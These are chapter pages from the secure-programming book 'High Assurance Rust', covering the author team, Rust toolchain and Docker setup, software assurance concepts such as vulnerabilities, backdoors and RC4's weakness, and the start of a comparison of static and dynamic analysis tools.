<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="about-the-team"><a class="header" href="#about-the-team">About the Team</a></h1>
<h2 id="core-team"><a class="header" href="#core-team">Core Team</a></h2>
<p><strong>Tiemoko Ballo, <em>Author</em></strong> (<a href="https://tiemoko.com">tiemoko.com</a>)</p>
<p>Tiemoko is a Senior Cybersecurity Researcher.
His experience spans advanced tooling development at a US Department of Defense laboratory, publication at peer-reviewed academic conferences, and incident response at a Fortune 100 enterprise.
He received his Masters degree in Information Security from Carnegie Mellon University.</p>
<p><strong>Moumine Ballo, <em>Technical Editor</em></strong> (<a href="https://www.linkedin.com/in/moumine-ballo/">LinkedIn</a>)</p>
<p>Moumine is a Senior Staff Software Engineer.
He's worked on a cutting-edge mobile GPU, and written graphics engines for both AAA games on resource-constrained consoles and autonomous vehicle simulation.
He received his PhD in Computer Science from the Warsaw University of Technology.</p>
<p><strong>Alex James, <em>Technical Editor</em></strong> (<a href="https://buildbreak.net/">buildbreak.net</a>)</p>
<p>Alex is a Security Software Engineer.
He works on web-scale secure architecture and cloud infrastructure, designing and implementing distributed security systems that serve over 300 million daily active users.
He received his Masters degree in Information Security from Carnegie Mellon University.</p>
<h2 id="community-contributors"><a class="header" href="#community-contributors">Community Contributors</a></h2>
<p>Huge thank you to everyone making this book better<sup class="footnote-reference" id="fr-Contrib-1"><a href="#footnote-Contrib">1</a></sup>!
Listed alphabetically:</p>
<ul>
<li><a href="https://github.com/aelnona">aelnona</a></li>
<li><a href="https://github.com/asher-gh">asher-gh</a></li>
<li><a href="https://github.com/drlef">drlef</a></li>
<li><a href="https://github.com/Druthyn">Druthyn</a></li>
<li><a href="https://github.com/duzumaki">duzumaki</a></li>
<li><a href="https://github.com/humb1t">humb1t</a></li>
<li><a href="https://github.com/jam1garner">jam1garner</a></li>
<li><a href="https://github.com/jamesreprise">jamesreprise</a></li>
<li><a href="https://github.com/jkoeppeler">jkoeppeler</a></li>
<li><a href="https://github.com/KateMorley">KateMorley</a></li>
<li><a href="https://github.com/kaylynn234">kaylynn234</a></li>
<li><a href="https://github.com/LoganDark">LoganDark</a></li>
<li><a href="https://github.com/Michcioperz">Michcioperz</a></li>
<li><a href="https://github.com/pixelshot91">pixelshot91</a></li>
<li><a href="https://github.com/qrilka">qrilka</a></li>
<li><a href="https://github.com/rrevi">rrevi</a></li>
<li><a href="https://github.com/samestep">samestep</a></li>
<li><a href="https://github.com/shak360">shak360</a></li>
<li><a href="https://github.com/SilvanCodes">SilvanCodes</a></li>
<li><a href="https://github.com/sshine">sshine</a></li>
<li><a href="https://github.com/tshepang">tshepang</a></li>
<li><a href="https://github.com/U007D">U007D</a></li>
<li><a href="https://github.com/vishallama">Vishal Lama</a></li>
</ul>
<br>
<hr>
<ol class="footnote-definition"><li id="footnote-Contrib">
<p>Contributions are welcome and appreciated. Please see <a href="https://github.com/tnballo/high-assurance-rust/blob/main/CONTRIBUTING.md"><code>CONTRIBUTING.md</code></a>. <a href="#fr-Contrib-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="warmup-environment-setup"><a class="header" href="#warmup-environment-setup">Warmup: Environment Setup</a></h1>
<blockquote>
<p><strong>WARNING:</strong> The book's container is currently not functional, we'll fix and add it to CI at a later time. Please setup your toolchain via another means, like a local install.</p>
</blockquote>
<p>In lieu of the usual chapter-end challenge, let's do a warm up: setting up the Rust toolchain.
What you'll need to write and compile Rust programs.
Consider this your bootstrap sequence!</p>
<p>This book is developed on a Linux host.
Throughout each chapter, you'll see commands you can retype (or copy/paste, note the button on the right) and execute.
In a code-block-listing format, like this:</p>
<pre><code class="language-ignore">whoami
</code></pre>
<p>The commands assume you're using a mainstream Linux distribution.
To follow along, you have two options:</p>
<ol>
<li>
<p><strong>Linux-native:</strong> Install each tool introduced on your host, using its current official documentation (we won't attempt to duplicate all installation instructions here) or your distro's package manager. Most of our tools have straightforward setups, often one or two commands.</p>
</li>
<li>
<p><strong>Docker container:</strong> If you're on a non-Linux platform, install Docker<sup class="footnote-reference" id="fr-Docker-1"><a href="#footnote-Docker">1</a></sup> (a popular containerization tool) and use this book's provided Dockerfile<sup class="footnote-reference" id="fr-BookDocker-1"><a href="#footnote-BookDocker">2</a></sup> to build a self-contained development environment.</p>
</li>
</ol>
<blockquote>
<p><strong>Note: Current State of the Container</strong></p>
<p>This book's container support is currently a work in progress.
In the future, the container will be automatically tested and detailed instructions for working with it will be added to the appendix.</p>
<p>Currently, we provide a simple Dockerfile within the book's repo<sup class="footnote-reference" id="fr-BookDocker-2"><a href="#footnote-BookDocker">2</a></sup>.</p>
</blockquote>
<p>Regardless of which route you choose, you'll want to verify your toolchain is working.</p>
<h2 id="try-the-toolchain"><a class="header" href="#try-the-toolchain">Try the Toolchain</a></h2>
<p><code>rustup</code> is the official installer and update manager for the Rust toolchain.
Among other pieces, it bundles Rust's:</p>
<ul>
<li>Compiler (<code>rustc</code>)</li>
<li>Package manager (<code>cargo</code>)</li>
<li>Standard library (<code>std</code>)</li>
</ul>
<p><code>rustup</code> can select toolchain components from three "channels": stable, beta, and nightly.
We'll cover the differences in Chapter 3.
It can also add components to cross-compile for other platforms.
We'll compile for an emulated ARM Cortex-M microcontroller in Chapter 8.</p>
<p>If not using the container, you can install <code>rustup</code> by following the instructions here:</p>
<ul>
<li><a href="https://www.rust-lang.org/tools/install">https://www.rust-lang.org/tools/install</a></li>
</ul>
<p>To verify the installation, execute the command:</p>
<pre><code class="language-ignore">rustup --version
</code></pre>
<p>Let's ensure you can compile and run a Rust program.
To create a new project named <code>hello_world</code>:</p>
<pre><code class="language-ignore">cargo new --bin hello_world
</code></pre>
<p>Running <code>tree hello_world</code> should show the following directory layout:</p>
<pre><code class="language-ignore">hello_world/
├── Cargo.toml
└── src
    └── main.rs

1 directory, 2 files
</code></pre>
<p><code>Cargo.toml</code> is a build configuration file.
You won't need to edit it to compile this program.
Take a look at the contents of <code>main.rs</code>, the sole source file:</p>
<pre><code class="language-ignore">cd hello_world
cat src/main.rs
</code></pre>
<p>A traditional "Hello, world!" program has been pre-populated:</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    println!("Hello, world!");
}</code></pre></pre>
<p>To compile and run it, from with the <code>hello_world</code> directory, use:</p>
<pre><code class="language-ignore">cargo run
</code></pre>
<p>If you see the greeting printed to the console, you've got a working toolchain!</p>
<h2 id="add-rust-analyzer-to-your-ide-of-choice"><a class="header" href="#add-rust-analyzer-to-your-ide-of-choice">Add <code>rust-analyzer</code> to Your IDE of Choice</a></h2>
<p><code>rust-analyzer</code><sup class="footnote-reference" id="fr-RustAnalyzer-1"><a href="#footnote-RustAnalyzer">3</a></sup> is an implementation of the Language Server Protocol<sup class="footnote-reference" id="fr-LangProt-1"><a href="#footnote-LangProt">4</a></sup> for Rust.
It integrates with several editors and Integrated Development Environments (IDEs) to support conveniences like:</p>
<ul>
<li>Syntax/warning/error highlighting</li>
<li>Code completion</li>
<li>"Goto" functionality for definitions</li>
<li>Symbol renaming</li>
</ul>
<p>Workflow aids like these can boost productivity.
Both for newcomers to a language and for professionals working on large codebases.
While not a requirement, we strongly recommend installing <code>rust-analyzer</code> or an equivalent (several commercial IDEs offer similar Rust support).</p>
<p>To get started with <code>rust-analyzer</code>, see it's manual:</p>
<ul>
<li><a href="https://rust-analyzer.github.io/manual.html">https://rust-analyzer.github.io/manual.html</a></li>
</ul>
<h2 id="the-optional-docker-route"><a class="header" href="#the-optional-docker-route">The Optional Docker Route</a></h2>
<p>Docker<sup class="footnote-reference" id="fr-Docker-2"><a href="#footnote-Docker">1</a></sup> is a popular containerization tool.
Containers allow us to build and configure entire environments in a repeatable and reliable way:</p>
<ul>
<li>
<p>In <strong>industry</strong>, containers can package a networked application alongside its dependencies so it's ready to deploy on cloud infrastructure.</p>
</li>
<li>
<p>In <strong>academia</strong>, containers bundle prototypes and analyses so that research results can be independently reproduced.</p>
</li>
<li>
<p>In <strong>open-source software</strong>, containers automate building a project and thus reduce the entry barrier for current/future contributors.</p>
</li>
</ul>
<p>Our motivation is closest to the open-source use case.
Instead of setting up a container to build a specific project, we'll use a container pre-setup for developing Rust projects.</p>
<h3 id="but-i-want-to-learn-rust-not-docker"><a class="header" href="#but-i-want-to-learn-rust-not-docker">But I want to learn Rust, not Docker!</a></h3>
<p>Modern software development involves multiple tools and processes.
Docker solves problems that are orthogonal to those solved by any particular programming language.</p>
<p>In the context of this book, it'll give you a reliable, supported environment for running examples and completing hands-on challenges.
No "it worked on my machine" issues - you'll get the same hassle-free experience whether you're running Windows, Linux, or MacOS.</p>
<p>It's worth at least knowing how to build and run pre-existing Docker containers.
Which is the extent of our Docker coverage.
We won't cover advanced <code>docker</code> usage or writing <code>Dockerfiles</code>.
Or Docker internals, beyond the blurb below.</p>
<blockquote>
<p><strong>How does Docker actually work, in nutshell?</strong></p>
<p>Traditional Virtual Machines (VMs) provide isolation via duplication: they run an entire OS kernel, atop a [Type 2<sup class="footnote-reference" id="fr-Type2-1"><a href="#footnote-Type2">5</a></sup>] hypervisor, atop your system's kernel.
That's quite slow because now you're running two OS kernels, host and guest, plus glue software.</p>
<p>By contrast, a Linux Docker container on a Linux host leverages special features of the host kernel ("control groups"<sup class="footnote-reference" id="fr-Cgroups-1"><a href="#footnote-Cgroups">6</a></sup> and "namespaces"<sup class="footnote-reference" id="fr-Namespaces-1"><a href="#footnote-Namespaces">7</a></sup>) to isolate the container, as if it existed on a separate filesystem.
There's no duplication of kernels.</p>
<p>Relative to VMs, you can run isolated applications faster (throughput) and/or fit more on a single physical machine (density).</p>
</blockquote>
<h3 id="getting-started-with-the-books-docker-container"><a class="header" href="#getting-started-with-the-books-docker-container">Getting Started with the Book's Docker Container</a></h3>
<p>Platform-specific installation instructions for Docker are available here:</p>
<ul>
<li><a href="https://docs.docker.com/get-docker/">https://docs.docker.com/get-docker/</a></li>
</ul>
<p>The book's Dockerfile is available here:</p>
<ul>
<li><a href="https://github.com/tnballo/high-assurance-rust/blob/main/Dockerfile">https://github.com/tnballo/high-assurance-rust/blob/main/Dockerfile</a></li>
</ul>
<p>Your IDE of choice may offer a plugin for connecting to and/or managing containers.
For example, VSCode offers an official extension:</p>
<ul>
<li><a href="https://code.visualstudio.com/docs/remote/containers">https://code.visualstudio.com/docs/remote/containers</a></li>
</ul>
<h2 id="checkpoint"><a class="header" href="#checkpoint">Checkpoint</a></h2>
<p>Before proceeding, please ensure you've successfully compiled and run the above "Hello, world!" program.
Either natively or in a container.</p>
<p>We're going to write a more interesting program in the next chapter, you'll want a working toolchain to follow along.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-Docker">
<p><a href="https://docs.docker.com/get-started/overview/"><em>Docker overview</em></a> Docker (Accessed 2022). <a href="#fr-Docker-1">↩</a> <a href="#fr-Docker-2">↩2</a></p>
</li>
<li id="footnote-BookDocker">
<p><a href="https://github.com/tnballo/high-assurance-rust/blob/main/Dockerfile">https://github.com/tnballo/high-assurance-rust/blob/main/Dockerfile</a> <a href="#fr-BookDocker-1">↩</a> <a href="#fr-BookDocker-2">↩2</a></p>
</li>
<li id="footnote-RustAnalyzer">
<p><a href="https://microsoft.github.io/language-server-protocol/"><em><code>rust-analyzer</code></em></a>. rust-analyzer (Accessed 2022). <a href="#fr-RustAnalyzer-1">↩</a></p>
</li>
<li id="footnote-LangProt">
<p><a href="https://microsoft.github.io/language-server-protocol/"><em><code>Language Server Protocol</code></em></a>. Microsoft (Accessed 2022). <a href="#fr-LangProt-1">↩</a></p>
</li>
<li id="footnote-Type2">
<p><a href="https://en.wikipedia.org/wiki/Hypervisor#Classification"><em>Hypervisor: Classification</em></a>. Wikipedia (Accessed 2022). <a href="#fr-Type2-1">↩</a></p>
</li>
<li id="footnote-Cgroups">
<p><a href="https://www.linuxjournal.com/content/everything-you-need-know-about-linux-containers-part-i-linux-control-groups-and-process"><em>Everything You Need to Know about Linux Containers, Part I: Linux Control Groups and Process Isolation</em></a>. Petros Koutoupis (2018). <a href="#fr-Cgroups-1">↩</a></p>
</li>
<li id="footnote-Namespaces">
<p><a href="https://www.linuxjournal.com/content/everything-you-need-know-about-linux-containers-part-ii-working-linux-containers-lxc"><em>Everything You Need to Know about Linux Containers, Part II: Working with Linux Containers (LXC)</em></a>. Petros Koutoupis (2018). <a href="#fr-Namespaces-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="software-assurance"><a class="header" href="#software-assurance">Software Assurance</a></h1>
<hr />
<p>The U.S. Department of Defense (DoD) defines <strong>software assurance</strong> as<sup class="footnote-reference" id="fr-DoD-1"><a href="#footnote-DoD">1</a></sup>:</p>
<blockquote>
<p>... the level of confidence that software functions as intended and is free of vulnerabilities, either intentionally or unintentionally designed or inserted as part of the software.</p>
</blockquote>
<p>That's a succinct definition, yet there's depth to unpack.
Regardless of your political ideology or national affiliation, this definition is a shrewd lens through which to reason about the security of a specific system.</p>
<h2 id="vulnerabilities-the-root-cause-of-insecurity"><a class="header" href="#vulnerabilities-the-root-cause-of-insecurity">Vulnerabilities: The Root Cause of Insecurity</a></h2>
<p>As someone who's written a program before, you're likely all too familiar with the idea of a <strong>bug</strong> - a mistake that causes your program to misbehave.
A subset of the bugs present in a program may be <strong>vulnerabilities</strong>, meaning they can be <em>exploited</em> by an attacker.
Let's contrast two scenarios to clarify the distinction:</p>
<ol>
<li>
<p>Can't login with valid credentials?</p>
<ul>
<li>Authentication is broken.</li>
<li>Everyone, including legitimate users, <em>can't</em> access data.</li>
<li>That's a <em>bug</em>, the software doesn't work correctly.</li>
</ul>
</li>
<li>
<p>Can login with invalid credentials?</p>
<ul>
<li>Authentication is broken.</li>
<li>Anyone, including an attacker, <em>can</em> access data.</li>
<li>That's a <em>vulnerability</em> which might be exploited to view or modify sensitive data.</li>
</ul>
</li>
</ol>
<p>While the DoD definition encapsulates a lack of bugs with <em>"software functions as intended"</em>, the security-relevant goal is moving toward software that is <em>"free of vulnerabilities"</em>.
This book is about both.
We want to build robust and secure systems.</p>
<p>To be frank: no software is <em>completely</em> free of vulnerabilities or <em>absolutely</em> secure.
A secure system, colloquially, is one in which the cost of an attack far exceeds the value of any assets.
Assets could be hardware, software, or confidential information - any part of the system we should protect.
We can't make attacks impossible, just impractical.</p>
<p>As security practitioners, we strive to <del>weaponize</del> minimize vulnerabilities - just as software engineers strive to minimize bugs.
Fewer vulnerabilities, fewer practical attacks.
But even formal verification, a topic we'll explore in later chapters, has limitations.
There are just too many complex interactions, both with hardware and between software components, for anyone to be totally certain that any given system can withstand every possible threat model.</p>
<h2 id="hence-assurance"><a class="header" href="#hence-assurance">Hence Assurance</a></h2>
<p>This is where <em>"level of confidence"</em> comes in.
By applying a series of tools and processes, some of which we'll sample in this chapter, we can build confidence in the security of our software.
Broadly speaking, these fall into one of three categories:</p>
<ul>
<li>
<p><strong>Static Assurance</strong> - checks done on code without running it, during development and/or testing.</p>
</li>
<li>
<p><strong>Dynamic Assurance</strong> - checks done by running the program, during testing.</p>
</li>
<li>
<p><strong>Operational Assurance</strong> - measures taken when the software is running in <strong>production</strong>.</p>
</li>
</ul>
<blockquote>
<p><strong>What does "production" mean in this context?</strong></p>
<p>The environment in which information systems serve their customers.
Every security decision you make should be driven by the realities of this environment.</p>
<p>For a web application, that might mean "the cloud" (virtual machines provisioned at various geographic locations) for backend components. And "the client" (hardware owned by the end user, like a smartphone running an app or browser) for front-end components.</p>
<p>For an embedded system, production could be a wide variety of adventurous places.
In the automotive case, it's on a little computer inside the dashboard of your car, connected to both sensors and steering.</p>
</blockquote>
<p>We'll build a conceptual foundation for understanding the why and how of each category, and spend the bulk of this book applying that knowledge hands-on.
Since  we're focused on writing code and using tools, we will <em>not</em> cover high-level software engineering<sup class="footnote-reference" id="fr-SWEBook-1"><a href="#footnote-SWEBook">2</a></sup> methodologies.
This includes:</p>
<ul>
<li>
<p><strong>Systems Development Life Cycle (SDLC<sup class="footnote-reference" id="fr-SDLC-1"><a href="#footnote-SDLC">3</a></sup>):</strong> a general process for planning, creating, testing, and deploying any information system.</p>
</li>
<li>
<p><strong>Microsoft Security Development Lifecycle (SDL<sup class="footnote-reference" id="fr-SDL-1"><a href="#footnote-SDL">4</a></sup>):</strong> a framework for reducing the likelihood and maintenance cost of software security vulnerabilities.</p>
</li>
</ul>
<p>While methodologies like these are valuable blueprints, and you can map concepts from this chapter to them, we won't discuss them. Just know that project-level best practices exist and can provide a shared language for communicating with organizational leadership.</p>
<p>The DoD definition also mentions the idea of <em>"intentionally...designed or inserted"</em> vulnerabilities, commonly called <em>back doors</em>.
Because code we write will only have a few well-trusted dependencies outside of Rust's standard library<sup class="footnote-reference" id="fr-StdVuln-1"><a href="#footnote-StdVuln">5</a></sup>, we won't be concerned with detecting back doors.
But you will see a simple backdoor in this chapter, to get a more visceral feel for the topic.</p>
<p>Rust is a promising security technology because it provides an unprecedented level of <strong>assurance</strong> under systems programming constraints.
The Rust compiler can prove the absence of a vicious class of vulnerabilities, colloquially referred to as "memory corruption bugs", while simultaneously matching the bare metal performance of languages that can't provide the same guarantee.
We'll deep-dive memory mechanics and safety in the next chapter, but it's worth reiterating as we head into this one.</p>
<h2 id="your-first-high-assurance-rust-program"><a class="header" href="#your-first-high-assurance-rust-program">Your First High Assurance Rust Program</a></h2>
<p>Theory is the foundation, but growth requires hands-on experience.
Let's hit the ground running.
The latter half of this chapter will be your first taste of <strong>high assurance systems programming</strong> in Rust.
In less than 200 lines of code (including tests), you will:</p>
<ul>
<li>
<p>Implement a tiny cryptographic library capable of running in nearly any embedded environment.</p>
</li>
<li>
<p>Verify your implementation using officially-released test vectors.</p>
</li>
<li>
<p>Insert a naive back door to understand where dynamic testing fails.</p>
</li>
<li>
<p>Add a command line front-end so you can use your library to encrypt local files.</p>
</li>
</ul>
<p>Despite the miniscule line count, our tool will be a modular system.
Composed of trustworthy components:</p>
<p align="center">
  <figure>
  <img width="100%" src="chp2/rcli_model.svg">
  </figure>
</p>
<p>Our 200 lines are those green boxes, the safe Rust components.
Both components carry guarantees with respect to memory safety.
Due to how we'll test, the encryption library carries evidence of logical correctness as well.</p>
<blockquote>
<p><strong>Memory Safety Validation for 3rd Party Libraries</strong></p>
<p>Rust projects can enable an optional attribute: <code>#![forbid(unsafe_code)]</code>.
It makes any use of <code>unsafe</code> a compile-time error, within the boundary of a single binary or library.</p>
<p>Building a 3rd-party <code>#![forbid(unsafe_code)]</code> dependency from source allows the compiler to automatically verify that code procured by an external entity is memory-safe.
Barring a bug in the compiler itself.</p>
</blockquote>
<p>But real-world teams can't expect to validate every single byte of executable code in any non-trivial system.
Whether the validation is for memory safety or some other property.
To ship quickly, we:</p>
<ul>
<li>
<p>Rely on Rust's standard library, and widely-used 3rd party libraries, to build the front-end.</p>
</li>
<li>
<p>Transitively rely on <code>libc</code> - the C standard library (dynamic memory allocator, POSIX APIs, etc) - to build the front-end.</p>
</li>
<li>
<p>Transitively rely on a mature operating system to deliver interactive functionality to the end-user.</p>
</li>
</ul>
<p>Our ambition is to eliminate high-level design flaws, logic bugs, and memory errors in the code we write.
If an attacker's only viable option is finding vulnerabilities in the standard library, the latest version of a well-known 3rd party dependency, or the OS itself - then the <em>cost</em> to compromise our system is likely <em>high</em>.</p>
<h2 id="but-is-it-truly-high-assurance"><a class="header" href="#but-is-it-truly-high-assurance">But is it <em>truly</em> high assurance?</a></h2>
<p>No, we intentionally make a concession: using RC4, a broken encryption algorithm.
Two reasons:</p>
<ul>
<li>
<p>To keep source line count low. RC4 is simple, so it works as an example.</p>
</li>
<li>
<p>To motivate you to take on this chapter's challenge, which asks you to switch the modular CLI tool to a modern encryption backend.</p>
</li>
</ul>
<p>RC4 was once part of protocols our society relies on, like SSL/TLS and WEP.
But since its debut in 1987<sup class="footnote-reference" id="fr-Rivest-1"><a href="#footnote-Rivest">6</a></sup>, multiple weaknesses have been found and several practical attacks have been demonstrated.</p>
<p>This is a microcosm of an important axiom: assurance is a moving target.
As the security landscape changes, so must requirements and measures taken.</p>
<h2 id="motivation"><a class="header" href="#motivation">Motivation</a></h2>
<p>Before pressing forward, let's take a quick step back: why prioritize software assurance in the first place?</p>
<p>We'd wager another DoD statement sums it up nicely.
Feel free to replace <em>"mission critical"</em> with "business critical" in the below description of the price of insecure software<sup class="footnote-reference" id="fr-DoD-2"><a href="#footnote-DoD">1</a></sup>:</p>
<blockquote>
<p>Consequences: The enemy may steal or alter mission critical data; corrupt or deny the function of mission critical platforms</p>
</blockquote>
<p>Welcome to cyberspace.
Let's secure the frontier!</p>
<h2 id="learning-outcomes-1"><a class="header" href="#learning-outcomes-1">Learning Outcomes</a></h2>
<ul>
<li>Understand the tradeoffs between static and dynamic analyses</li>
<li>Understand the role of operational deployment measures</li>
<li>Write your first interesting Rust program: a tiny encryption tool</li>
<li>Learn how to build a statically-linked executable (works on nearly any Linux client)</li>
</ul>
<hr>
<ol class="footnote-definition"><li id="footnote-DoD">
<p><a href="https://www.acqnotes.com/Attachments/DoD%20Software%20Assurance%20Initiative.pdf"><em>DoD Software Assurance Initiative</em></a>. Mitchell Komaroff, Kristin Baldwin (2005, Public Domain) <a href="#fr-DoD-1">↩</a> <a href="#fr-DoD-2">↩2</a></p>
</li>
<li id="footnote-SWEBook">
<p><a href="https://cs.fit.edu/~kgallagher/Schtick/Serious/SWEBOKv3.pdf"><em>Guide to the Software Engineering Body of Knowledge</em></a>. Pierre Bourque, Richard E. Fairley (2014) <a href="#fr-SWEBook-1">↩</a></p>
</li>
<li id="footnote-SDLC">
<p><a href="https://en.wikipedia.org/wiki/Systems_development_life_cycle"><em>Systems development life cycle</em></a>. Wikipedia (Accessed 2022). <a href="#fr-SDLC-1">↩</a></p>
</li>
<li id="footnote-SDL">
<p><a href="https://www.microsoft.com/en-us/securityengineering/sdl"><em>Microsoft Security Development Lifecycle (SDL)</em></a>. Microsoft (2021) <a href="#fr-SDL-1">↩</a></p>
</li>
<li id="footnote-StdVuln">
<p>Rust's standard library, like any large piece of software, it not guaranteed to be free of vulnerabilities. Two previously discovered vulnerabilities include a memory safety error in <code>unsafe</code> code<sup class="footnote-reference" id="fr-CVE1-1"><a href="#footnote-CVE1">7</a></sup> and a Time-of-check-to-time-of-use (TOCTTOU) race condition<sup class="footnote-reference" id="fr-CVE2-1"><a href="#footnote-CVE2">8</a></sup>. But <code>std</code> is a widely used component maintained by an official Rust team, so we can generally trust it more than 3rd party packages. Especially when it comes to back doors. <a href="#fr-StdVuln-1">↩</a></p>
</li>
<li id="footnote-Rivest">
<p>Coincidentally, Ron Rivest, inventor of RC4, also co-invented scapegoat trees - the data structure we'll implement in Chapter 7. Scapegoat trees never enjoyed the popularity of RC4, but they've certainly stood the test of time. <a href="#fr-Rivest-1">↩</a></p>
</li>
<li id="footnote-CVE1">
<p><a href="https://gts3.org/2019/cve-2018-1000657.html"><em>Analysis of CVE-2018-1000657: OOB write in Rust's VecDeque::reserve()</em></a>. GeorgiaTech SSLab (Accessed 2022). <a href="#fr-CVE1-1">↩</a></p>
</li>
<li id="footnote-CVE2">
<p><a href="https://blog.rust-lang.org/2022/01/20/cve-2022-21658.html"><em>Security advisory for the standard library (CVE-2022-21658)</em></a>. The Rust Team (Accessed 2022). <a href="#fr-CVE2-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="static-vs-dynamic-tools"><a class="header" href="#static-vs-dynamic-tools">Static vs. Dynamic Tools</a></h1>
<p>As authors of a mission-critical application, we must be confident that our code has few bugs and even fewer vulnerabilities, if any at all.
Security is necessary, but not in itself sufficient, for reliability.
We need both.
Yet we're writing software against an incomplete set of requirements and under time/resource constraints.
Ego aside, how can we justify our confidence?</p>
<p>The answer is quantitatively.
By accumulating enough pieces of objective proof, via processes and tools.
Academia calls this verification.
Yet prototypes lauded at research conferences are seldom mature enough for real-world, large-scale usage.
Thus industry adopts a pragmatic subset of verification techniques and under the label of <strong>testing</strong>.</p>
<p>The goal of testing is to verify consistency between two sides of the software coin:</p>
<ul>
<li>
<p><strong>Specification:</strong> The business-relevant requirements for a software product. Typically expressed in plain English, although "business logic" can be encoded in tool-specific formats (assertions, pre/post conditions, type states, etc).</p>
<ul>
<li><em>Plain English Example:</em> Our company's web application must protect a user's data from network-based attackers.</li>
</ul>
</li>
<li>
<p><strong>Implementation:</strong> The design and workings of a software product, expressed as actual code.</p>
<ul>
<li><em>Example:</em> The web application uses OpenSSL<sup class="footnote-reference" id="fr-OpenSSL-1"><a href="#footnote-OpenSSL">1</a></sup>, a industry-standard Transport Layer Security (TLS) library, to encrypt data sent over a network (confidentiality), verify the data wasn't corrupted in transit (integrity), and validate the identity of data senders/receivers (authentication).</li>
</ul>
</li>
</ul>
<p>We gain confidence if we can demonstrate that specification and implementation are aligned.
This is where tools that analyze our programs come in.
All analysis tools output little fragments of evidence, tiny specification-implementation congruences.
They aren't a <em>substitute</em> for manual processes, like code review and security assessments, because they can't match the "smarts" of a skilled person.
Tools are instead a <em>supplement</em>, reducing cost and facilitating scale.</p>
<p>Unlike humans, tools are ruthlessly diligent: they never get tired or distracted.
They are also completely consistent, even in the false positive case (reporting a bug when there isn't one).
For detection of certain security issues, like memory safety violations, consistent tools are the best way to achieve assurance.</p>
<p>Rust is far from perfect.
But, given an incredibly modern compiler, it blurs the line between a commercially-viable programming language and a sophisticated tool for validating certain runtime reliability properties.
The type system bridges the two, the toolchain democratizes the benefits.
We can demonstrably answer confidence-inspiring questions like:</p>
<ul>
<li>
<p><strong>Can my program <em>ever</em> encounter a memory error at runtime?</strong></p>
<ul>
<li>Rust's compiler provides the answer when building our code for the first time.</li>
<li>That's a <strong>static analysis</strong>. The program never executed.</li>
<li>The answer applies to most<sup class="footnote-reference" id="fr-Most-1"><a href="#footnote-Most">2</a></sup> realistic states the program can enter!</li>
<li>This is a <em>safety property<sup class="footnote-reference" id="fr-Safety-1"><a href="#footnote-Safety">3</a></sup></em>: we check that the program can never reach a bad state.</li>
</ul>
</li>
<li>
<p><strong>Will my program produce the correct result if given this <em>specific</em> input?</strong></p>
<ul>
<li>Rust's official package manager, <code>cargo</code>, answers when a unit test runs.</li>
<li>That's a <strong>dynamic analysis</strong>. Part of the program executed with concrete inputs.</li>
<li>The answer applies only to the states you tested and those semantically close.</li>
<li>This is a <em>liveness property</em>: we check that the program will reach a good state.</li>
</ul>
</li>
</ul>
<p>Note how our memory safety question is answered statically, at compile-time, and the input-output correctness question is answered dynamically, at runtime.
The static/dynamic dichotomy is at the crux of analysis tool design.</p>
<p>Static and dynamic analyses are a sort of "Yin and Yang"<sup class="footnote-reference" id="fr-YinYang-1"><a href="#footnote-YinYang">4</a></sup>, in that they're opposite yet complementary powers.
In fitting dualistic fashion, they offer a contrasting set of strengths and weaknesses - underpinned by different algorithms and techniques.</p>
<blockquote>
<p><strong>What is a unit test?</strong></p>
<p>A hand-written but automatically runnable check for a subset of a program.
Usually implemented by calling individual functions and verifying either return values or side effects.</p>
<p>Unit tests are fallible and often incomplete, but superior to the majority of automation approaches - due to higher semantic insight.
We'll walk through a unit test when we get into dynamic analysis.</p>
</blockquote>
<h2 id="a-lay-of-the-land-for-practicing-engineers"><a class="header" href="#a-lay-of-the-land-for-practicing-engineers">A Lay of the Land for Practicing Engineers</a></h2>
<p>Before we get too far into Computer Science territory, let's break down the solution space from a practicing engineer's perspective.
Assume we're interested in tooling because we need to either expedite or scale testing processes.
Broadly speaking, how can we cluster today's static and dynamic tools?</p>
